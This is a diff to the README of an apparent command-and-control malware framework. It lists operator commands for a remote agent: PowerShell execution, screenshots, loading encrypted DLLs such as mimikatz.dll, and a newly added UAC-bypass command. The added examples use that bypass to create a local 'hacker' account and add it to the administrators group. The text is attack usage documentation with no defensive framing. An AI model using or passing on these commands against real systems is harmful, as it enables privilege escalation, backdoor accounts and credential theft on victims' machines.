@@ -140,6 +140,7 @@ FrameworkC2/
   - `shell <command>` - Execute PowerShell
   - `scr` - Screenshot all monitors
   - `!loaddll` - Load DLL from attachment (XOR encrypted)
+  - `!uacbypass [cmd]` - Execute command with elevated privileges (UAC bypass)
   - `help` - Show available commands
 
 ### PE Loader (c2_common)
@@ -264,6 +265,13 @@ scr
 
 # Load specific DLL by name
 !loaddll mimikatz.dll
+
+# UAC Bypass - spawn elevated cmd.exe
+!uacbypass
+
+# UAC Bypass - execute command with elevated privileges
+!uacbypass net user hacker Password123! /add
+!uacbypass net localgroup administrators hacker /add
 
 # Show help
 help
